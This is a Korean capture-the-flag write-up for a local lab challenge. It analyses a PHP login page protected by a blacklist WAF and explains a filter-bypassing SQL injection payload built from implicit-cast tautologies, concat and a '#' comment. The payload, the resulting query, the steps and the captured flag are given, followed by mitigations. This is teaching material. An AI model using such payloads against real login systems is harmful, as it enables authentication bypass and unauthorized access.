# [injection] SQLi #2 — 필터 우회 라이트업

- 대상: `arang-edu-challs-collection` / `challenges/injection/sqli-2`
- 카테고리: injection
- 버그클래스: SQL Injection (WAF bypass)
- 포트: 9202

## 취약점 분석

`challenges/injection/sqli-2/html/index.php`:

```php
function waf($s){ $t=strtolower($s);
  if(preg_match("/or|union|admin|\||\&|\d|-|\\\\|\x09|\x0b|\x0c|\x0d|\x20|\//",$t)) die('no hack..');
  return $s; }
...
$uid = waf($_GET['userid']); $upw = waf($_GET['userpw']);
$q = "SELECT userid FROM sqli2_table WHERE userid='$uid' AND userpw='$upw'";
$r = $m->query($q); $u = '';
if ($r && $r->num_rows > 0) { while ($row = $r->fetch_assoc()) { $u = $row['userid']; break; } }
if ($u === 'admin') { echo getenv('FLAG_SQLI_2'); } else { echo htmlspecialchars($u); }
```

`waf()`는 소문자 변환 후 정규식으로 아래를 모두 차단한다.

- `or`, `union`, `admin` (리터럴 단어)
- `|`, `&`
- 숫자 전부(`\d`)
- `-` (하이픈, `-- ` 주석 무력화)
- `\` (백슬래시)
- 탭/수직탭/폼피드/캐리지리턴/스페이스 (`\x09,\x0b,\x0c,\x0d,\x20`)
- `/` (슬래시)

**줄바꿈(LF, `\x0a`)은 차단 목록에 없다** — 공백 대체 용도로 흔히 쓰이는 대표적 필터 구멍이다. 필터를 통과한 값은 escape 없이 그대로 쿼리 문자열에 삽입된다(SQL Injection 자체는 sqli-1과 동일).

## 익스플로잇 로직

### 1) `or`/숫자 없이 tautology 만들기 — `'a'='a'` 트릭

```sql
userid='a'='a'
```

MySQL은 `=`를 좌결합으로 평가하므로 `(userid='a')='a'`로 해석된다. 왼쪽 `userid='a'`는 참/거짓(1/0)의 정수값이 되고, 이를 다시 문자열 `'a'`와 비교하면 `'a'`는 암시적으로 숫자 `0`으로 캐스팅된다. 결과적으로 `(0 또는 1) = 0` 형태가 되어, **userid가 정확히 리터럴 `'a'`가 아닌 모든 행**(admin, guest 둘 다)에서 참이 된다. `or`, 숫자, 하이픈 없이 만든 tautology다.

### 2) `admin` 없이 admin 행만 특정 — `concat` 트릭

```sql
and(userid=concat('ad','min'))
```

`concat('ad','min')`은 런타임에 문자열 `"admin"`을 만들지만, 소스 코드에는 `admin`이라는 연속된 6글자가 존재하지 않아 필터를 통과한다. 앞의 tautology와 AND로 묶어 admin 행만 정확히 좁힌다.

### 3) 공백 없이 토큰 구분하기

공백·탭 등 모든 공백문자가 차단되므로, 따옴표(`'`)와 괄호(`(`, `)`)를 토큰 구분자로 활용해 공백 없이 이어 쓴다. SQL 렉서는 문자열 리터럴의 닫는 따옴표나 괄호를 만나면 그 자체로 토큰 경계가 되므로 `'a'and(...)`처럼 공백 없이 붙여 써도 정상 파싱된다.

### 4) 남은 `AND userpw='...'` 무력화

마지막에 `#`을 붙여 뒤에 남은 정적 템플릿 텍스트(`' AND userpw='$upw'`)를 주석 처리한다. 이후 실제 줄바꿈이 없으므로 문자열 끝까지 전부 주석 처리되어 비밀번호 검사가 완전히 사라진다.

## 최종 페이로드

**userid 입력값:**
```
a'='a'and(userid=concat('ad','min'))#
```

**userpw 입력값:**
```
x
```
(어차피 주석 처리되므로 임의 값)

폼의 두 입력창에 그대로 타이핑해서 제출 가능하다(줄바꿈이 필요 없어 별도 URL 인코딩/주소창 조작 없이 사용 가능).

### 최종 실행되는 쿼리

```sql
SELECT userid FROM sqli2_table WHERE userid='a'='a'and(userid=concat('ad','min'))#' AND userpw='x'
```

주석 이후를 제거하면 실질적으로:

```sql
SELECT userid FROM sqli2_table WHERE (userid='a'='a') AND (userid=concat('ad','min'))
```

admin 행만 정확히 매칭되어 `$u === 'admin'`이 참이 되고 flag가 출력된다.

## 진행 절차

1. `docker compose up -d --build sqli-2 db`
2. `http://localhost:9202` 접속
3. userid: `a'='a'and(userid=concat('ad','min'))#`, userpw: `x` 입력 후 login
4. 화면에 flag 출력 확인

## 플래그

```
flag{b715e24914d597b86ce5}
```

## 대응방안

- 블랙리스트 기반 WAF는 근본 대책이 아니다 — Prepared Statement(파라미터 바인딩)로 애초에 사용자 입력이 SQL 구문으로 해석될 여지를 없앨 것
- 문자열-숫자 암시적 형변환에 의존하는 비교를 피하고, 컬럼 타입에 맞는 엄격한 비교/검증 수행
- 특수문자뿐 아니라 공백류 전체(스페이스, 탭, 개행 등)를 놓치지 않고 필터링해도 결국 우회 가능하므로, 필터링 자체를 신뢰하지 말 것
